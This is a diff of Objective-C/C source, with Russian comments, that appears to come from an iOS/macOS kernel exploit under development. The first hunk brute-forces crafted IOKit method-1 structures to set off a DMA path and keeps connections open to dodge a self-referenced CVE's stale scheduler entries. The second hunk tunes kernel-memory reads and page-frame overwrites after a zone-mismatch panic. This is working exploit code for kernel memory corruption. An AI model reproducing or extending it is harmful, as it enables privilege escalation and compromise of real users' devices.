@@ -5716,30 +5716,50 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint32_t calDstID = IOSurfaceGetID(calD);
             io_connect_t conn0 = 0;
             if (IOServiceOpen(svc0, mach_task_self(), 0, &conn0) == KERN_SUCCESS && conn0) {
-                for (uint32_t base = 0x0C; base <= 0x40 && !tsdOK; base += 4) {
-                    uint8_t t[0x1B0];
-                    memset(t, 0, sizeof(t));
-                    *(uint32_t *)(t + 0) = calSrcID;
-                    *(uint32_t *)(t + 4) = calDstID;
-                    // пара rect'ов {x=0,y=0,w=32,h=32} в base и base+0x10
-                    *(uint32_t *)(t + base + 0x8) = 32;
-                    *(uint32_t *)(t + base + 0xC) = 32;
-                    *(uint32_t *)(t + base + 0x18) = 32;
-                    *(uint32_t *)(t + base + 0x1C) = 32;
-                    kern_return_t ckr = IOConnectCallMethod(conn0, 1, NULL, 0, t, sizeof(t), NULL, NULL, NULL, NULL);
-                    usleep(60000);
-                    IOSurfaceLock(calD, 0, NULL);
-                    uint32_t *pxc = (uint32_t *)IOSurfaceGetBaseAddress(calD);
-                    int nz = 0;
-                    if (pxc) for (int i = 0; i < 1024; i++) if (pxc[i]) nz++;
-                    IOSurfaceUnlock(calD, 0, NULL);
-                    if (nz) {
-                        memcpy(tsdGood, t, sizeof(tsdGood));
-                        tsdOK = YES;
-                        kpNote(r, [NSString stringWithFormat:@"  TSD-калибровка: DMA ПОШЁЛ с rect @ +%#x (kr=0x%x, nz=%d) — конфиг снят", base, ckr, nz]);
+                // 1.9.115: три паттерна rect на каждый base (прошлый свип писал
+                // {x,y,w,h} — если layout {srcW,srcH,dstW,dstH}, ширина была 0
+                // → гарантированный скип). kr логируем: kr!=0 = валидация
+                // режет конфиг, kr=0 без DMA = валиден но не execute.
+                kern_return_t firstBadKr = 0;
+                BOOL badLogged = NO;
+                for (int pat = 0; pat < 3 && !tsdOK; pat++) {
+                    for (uint32_t base = 0x0C; base <= 0x44 && !tsdOK; base += 4) {
+                        uint8_t t[0x1B0];
+                        memset(t, 0, sizeof(t));
+                        *(uint32_t *)(t + 0) = calSrcID;
+                        *(uint32_t *)(t + 4) = calDstID;
+                        if (pat == 0) {              // {w,h} одна пара
+                            *(uint32_t *)(t + base) = 32;
+                            *(uint32_t *)(t + base + 4) = 32;
+                        } else if (pat == 1) {       // {x,y,w,h}
+                            *(uint32_t *)(t + base + 8) = 32;
+                            *(uint32_t *)(t + base + 12) = 32;
+                        } else {                     // {w,h} обе пары (src+dst rect)
+                            *(uint32_t *)(t + base) = 32;
+                            *(uint32_t *)(t + base + 4) = 32;
+                            *(uint32_t *)(t + base + 0x10) = 32;
+                            *(uint32_t *)(t + base + 0x14) = 32;
+                        }
+                        kern_return_t ckr = IOConnectCallMethod(conn0, 1, NULL, 0, t, sizeof(t), NULL, NULL, NULL, NULL);
+                        if (ckr != 0 && !badLogged) { firstBadKr = ckr; badLogged = YES; }
+                        usleep(60000);
+                        IOSurfaceLock(calD, 0, NULL);
+                        uint32_t *pxc = (uint32_t *)IOSurfaceGetBaseAddress(calD);
+                        int nz = 0;
+                        if (pxc) for (int i = 0; i < 1024; i++) if (pxc[i]) nz++;
+                        IOSurfaceUnlock(calD, 0, NULL);
+                        if (nz) {
+                            memcpy(tsdGood, t, sizeof(tsdGood));
+                            tsdOK = YES;
+                            kpNote(r, [NSString stringWithFormat:@"  TSD-калибровка: DMA ПОШЁЛ — паттерн %d, rect @ +%#x (kr=0x%x, nz=%d)", pat, base, ckr, nz]);
+                        }
                     }
+                    if (!tsdOK)
+                        kpNote(r, [NSString stringWithFormat:@"  паттерн %d: DMA нигде (kr валидации: %#x)", pat, firstBadKr]);
                 }
-                IOServiceClose(conn0);
+                // conn0 и cal-поверхности намеренно НЕ закрываем до конца
+                // теста — teardown M2 оставляет stale-записи в scheduler'е
+                // (наша же CVE-2026-43655 мина), не поджигаем сами себя.
             }
         }
         if (!tsdOK)
@@ -5865,11 +5885,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         uint64_t newQ = 0;
         kreadbuf(hv, &origQ[h], 8);
         if (form == 2) {
-            if (origQ[h] != backingPA) {
-                kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: уже не backing (%#llx) — пропуск", h, (unsigned long long)hv, (unsigned long long)origQ[h]]);
-                continue;
-            }
-            newQ = ctlPA;
+            // 1.9.115: raw-поле НЕ трогаем — производный кэш (пересчитывается
+            // при wire из page-list); его перезапись ломала владение кучей
+            // (panic 100734, zone mismatch zalloc.c:829).
+            kpNote(r, [NSString stringWithFormat:@"  hit #%d @ %#llx: raw-поле — пропускаем (производный кэш, wire пересчитает из pfn)", h, (unsigned long long)hv]);
+            continue;
         } else {
             uint32_t cur = form ? (uint32_t)(origQ[h] >> 32) : (uint32_t)origQ[h];
             if (cur != pfn32) {
